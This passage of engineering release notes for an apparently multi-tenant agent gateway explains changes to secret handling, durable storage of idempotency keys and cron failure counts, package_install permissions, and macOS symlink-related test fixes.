when they did, every tenant's plugin ran on the operator's key — one identity
upstream, no per-tenant attribution, no per-tenant revocation.

### Not a second settings store

The correct home already exists. A secret in `settings:` is an author using the
wrong field, and building a per-workspace settings mechanism would bless the
mistake and leave tenants two places to set a plugin secret. The value is taken
from the vault namespace the plugin's declared credentials already use, so
there is one place; when the tenant has not supplied it, the key is withheld
and the operator is told to declare it properly.

`redact.SecretKeyName` decides what counts, the same predicate MCP uses — a key
that is a secret in one place is a secret in the other.

It RECURSES. `{"auth": {"api_key": "…"}}` is the ordinary way these files are
written, not an edge case, and a shallow check passes it straight through.
Withheld keys are reported by dotted path so an operator can find them in the
file rather than hunting a bare `api_key` that appears three times.

### A test that passed for the wrong reason

The first version of `TestTurningTheRequirementOnReachesLoadersAlreadyBuilt`
checked the flag and the empty withheld list, and **survived** the mutation
that made `applySettings` ignore the requirement entirely — the whole bug with
an extra step. Rewritten to drive `Stores` with a real plugin on disk, asserting
that a loader built BEFORE the requirement loses the operator's value when it
is turned on. The fixture had to be a PLATFORM plugin: one under a workspace's
own directory is visible to that workspace only and cannot show sharing at all.

---

## A workspace can define its own MCP servers now

The operator's catalog is the operator's, behind the platform credential. This
is the other half: a server the operator never published, belonging to one
workspace, surviving a restart.

Before, those lived in the pool's in-memory `overrides` map — a feature that
appears to work until the first deploy.

### The table

`internal/mcpstore`, one row per (workspace, server). The primary key is
COMPOSITE. Server IDs are human-chosen slugs and collide across tenants by
design — two teams will both call theirs "github" — and keying on the id alone
would let the second writer silently take over the first's definition. That is
trap 2 for the third time; the ownership catalog's discovery scan caught the
new table immediately, which is trap 3 working as intended.

### Secrets are not in it

This file is plain SQLite on the gateway's disk. A submitted `env` value or
header whose key looks like a credential is diverted to the per-workspace
vault, under the SAME namespace the operator's template servers use — so a
tenant sets a credential in one place whether the server is theirs or the
operator's.

The KEY stays in the row. Dropping it would lose the fact that the server wants
that credential, and the tenant would have nothing to look at to see what is
outstanding.

### The listing is deliberately not masked

The deployment-wide MCP list masks `env` and `headers` because config.yaml
genuinely holds the operator's tokens and anyone with `mcp:read` can call it.
These rows cannot hold a credential, so masking them would replace
`LOG_LEVEL: debug` with `***` for the tenant who typed it and buy nothing. A
mask that protects nothing still teaches people the mask means something.

The mutation that survived here was informative: removing the mask changed no
test, because the value was already blank. That is the mask being pointless
rather than the test being weak — so the mask went, and the test now asserts
the property that actually holds: the credential is absent AND the ordinary
configuration is visible.

### Two guards that fired on their own

The ownership scan flagged `internal/mcp/pool.go` as a durable repository — it
matched on the new `ServerStore` name. Classified as `Ephemeral` with a note
rather than renaming the type to slip past the scan.

The hardcoded-timeout guard went from 23 to 25. The two new deadlines are vault
reads, so they became one named `vaultReadTimeout` with a reason: it is
deliberately outside the run/step/LLM hierarchy, which budgets a user's
request, where this is an infrastructure read on the way to starting a
subprocess. Tying it to the run budget would make a long-running agent wait
longer for a local database than a short one does.

### Deletion

Registered as a workspace purger, so deleting a workspace takes its servers
with it and only its own.

---

## Three scale blockers closed, and two that were never true

### The idempotency cache was a map

`Idempotency-Key` promises that retrying a mutation does not perform it twice.
The store keeping that promise was a map in one gateway's memory, so the
promise held for exactly as long as one process lived and one process served
the client.

It broke two ways, both silent. A restart between the original request and the
retry emptied the map — and the restart is usually WHY the client retried. And
a retry landing on another replica found an empty map for the same reason. In
either case the mutation simply happens twice: two runs submitted, two agents
created, two of whatever the route does.

Now SQLite-backed, in EVERY mode. Not gated on multi-user like the credential
rules, because this broke a personal installation too; the second replica added
a case to an existing bug rather than creating one.

`INSERT ... ON CONFLICT DO NOTHING` inside one transaction, because the
property needed is "exactly one caller reserves this key" and that is a
uniqueness constraint. Checking for a row and then inserting is two statements
with a window between them, and the window IS the concurrent-duplicate case
this refuses.

Expiry is deleted in the same transaction as the insert. Doing it separately
would let two retries both observe the expiry and both believe they reserved
the key.

**A test that could not fail.** Every rule the durable store enforces is also
enforced by the map, which is the point of them agreeing — so the mutation that
made `idempotencyStore` ignore its durable backing entirely passed everything.
Only crossing a process boundary THROUGH the store distinguishes them.
`TestTheStoreActuallyUsesItsDurableBacking` does that; the earlier tests
exercised the backend directly and vouched for nothing about the delegation.

### The scheduler's failure counter was per-process

A cron agent that fails N times in a row is auto-disabled, so a permanently
broken one stops firing on a loop nobody watches. The counter was in memory.

Schedules are claimed durably, so exactly one replica fires each occurrence —
but not the same one each time. Replica A fails: its count is 1. Replica B
claims the next occurrence and fails: ITS count is 1. With two replicas the
limit is reached at best half as often, with three effectively never. The agent
fires forever, once per replica, and nothing errors — the safety valve is
simply absent.

A restart does the same to a single process, so this was never only a scale
bug.

The count is a column on the schedule row now, incremented and read in ONE
statement: two replicas failing close together would otherwise both read N and
both write N+1, which is the same undercounting in a smaller window. The
in-memory map remains for agents fired without a durable schedule row, where it
is still better than nothing. Both paths converge on one `applyFailureCount`,
so the quarantine decision cannot drift between them.

### package_install's exemption is withdrawn in multi-user

`package_install` is exempt from `runtime.allow_system_agents` for the built-in
System agent, so a single-user operator has a safe install path without turning
on `shell_exec`. In that setting it is right.

In multi-user it is not. The installer runs OUTSIDE the privileged-command
sandbox by design — it needs network and must persist — and it writes the
deployment-wide config and a process-global install directory. The System agent
is only present there under `unsafe_tenant_system_agent`, which restores a chat
agent, not the right to rewrite the deployment.

The tool is not removed. It goes back behind `allow_system_agents`, so an
operator who genuinely wants it says so a second time.

The field defaults to FALSE on a zero-valued Engine, and one existing test had
to start saying it wants the exemption. That is the right default: it grants a
tool, and a grant that switches itself on when somebody forgets to configure it
is the wrong way round.

### Two entries were wrong, and being wrong costs the list its credibility

`ScaleReplicationBlockers` said cancellation only works if the request reaches
the executing replica. For DURABLE runs that has never been true:
`RequestCancel` writes the record and `watchForCancellation` polls it, so any
replica's request reaches the executing one. The comment there says so. Only
chat and stream runs, which live in an in-memory registry, are replica-local.
The entry is narrowed to say that.

The list is down from seven to five, and what left it is recorded in the file
rather than deleted — a reader should be able to see what moved off, not wonder
whether it was ever there.

### Still on the list

Artifacts on local disk. Conversations in one replica's memory. Approvals
releasable only on the pausing replica. Event streams not resumable across
replicas. Chat and stream cancellation.

Each of those is a feature — shared object storage, externalised session state,
a durable approval-release path, a resumable event cursor, a cross-replica
cancellation signal — not a defect with a fix.

---

## Two tests that only failed on macOS

Reported from a real Mac after the commits landed. `go test ./...` failed twice
in `internal/runtime` — and `make security`, which runs the SAME package's
isolation suite, passed. That combination is the tell: not a product defect, an
environment one.

macOS hands `t.TempDir()` a path under `/var`, which is a symlink to
`/private/var`. The filesystem policy resolves symlinks before deciding whether
a path is inside a workspace — it has to, or planting a symlink IS the escape —
so every root the engine derives comes back resolved. The tests then compared
the engine's `/private/var/...` against their own unresolved `/var/...`, and
failed for a reason with nothing to do with what they were testing.

Reproduced on Linux by pointing `TMPDIR` at a symlink, which produces both
failures with identical messages. Fixed by resolving the temp dir in the tests,
not by loosening the comparison: `pathWithinRoot` is the production containment
check, and a test that compares with something weaker than production stops
proving anything about production. Confirmed by mutation — making the
containment check return true still fails the suite.

### And one workaround that was hiding the same thing

`internal/mcp`'s `TestTwoWorkspacesGetTwoProcessesInTwoDirectories` already had
a suffix comparison with a comment about macOS `/private`. It passed on the
Mac, and it passed only because `/private/var/…` happens to END with
`/var/…`. It failed under a differently-shaped symlink, and it would have
passed on the WRONG tree with a coincidental tail.

Replaced with the same resolve-then-compare-exactly approach.

The whole suite now runs green under both a real temp root and a symlinked
one, which is the closest this container can get to proving the macOS path.
